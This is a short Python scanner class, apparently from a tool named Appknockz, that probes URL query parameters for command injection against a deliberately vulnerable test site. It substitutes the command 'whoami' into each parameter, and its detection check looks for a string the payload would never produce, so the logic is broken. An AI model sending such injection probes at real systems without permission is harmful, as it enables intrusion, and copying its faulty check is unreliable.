import urllib.parse
import requests
from urllib.parse import urlparse,parse_qs
import validators
class CommandInjection:


    payloads = ["whoami"]
    possible_Responses = []
    test_String = "Appknockz test"

    def __init__(self, url):
        self.url = url

    def check_url(self):
        return validators.url(self.url)

    def has_parameters(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True
        else:
            print("Provided URL is not valid")
            exit(0)


    def Inject(self):
        print(self.has_parameters())
        if self.has_parameters():
            parsed_url = urlparse(self.url)
            parameters = parse_qs(parsed_url.query)
            # Data formatting
            for parameter in parameters:
                parameters[parameter] = parameters[parameter][0]
            for parameter in parameters:
                for P in CommandInjection.payloads:
                    current_value = parameters[parameter]
                    parameters[parameter] = P
                    new_values = list(parsed_url)
                    new_values[4] = urllib.parse.urlencode(parameters)
                    build_url = urllib.parse.urlunparse(new_values)
                    data = requests.get(build_url)
                    if data.status_code == 200:
                        if CommandInjection.test_String in data.text:
                            print("There is code Injection")


                parameters[parameter] = current_value

if __name__ == '__main__':
    Injector = CommandInjection("http://testphp.vulnweb.com/search.php?test=query&dummy=test")
    Injector.Inject()


